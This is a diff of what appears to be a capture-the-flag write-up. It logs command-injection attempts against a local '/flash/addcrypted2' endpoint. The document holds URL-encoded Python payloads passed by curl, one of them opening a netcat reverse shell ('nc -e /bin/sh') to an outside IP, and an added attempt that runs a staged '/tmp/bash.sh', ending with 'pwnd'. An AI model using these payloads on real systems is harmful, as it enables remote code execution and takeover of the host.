@@ -152,3 +152,14 @@ pyimport%20os%3Bos.system(%22nc%20-e%20%2Fbin%2Fsh%2010.10.16.24%201234%22)%3B%0
 curl -i -s -k -X $'POST' \
     --data-binary $'jkpyimport%20os%3Bos.system(%22nc%2010.10.16.24%201234%22)%3Bf=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:9000/flash/addcrypted2'
+
+### new attempt
+curl -i -s -k -X $'POST' \
+    --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    $'http://127.0.0.1:9000/flash/addcrypted2'
+
+wwe had to createa  bash.sh at the system
+
+![](20230620002815.png)
+
+pwnd
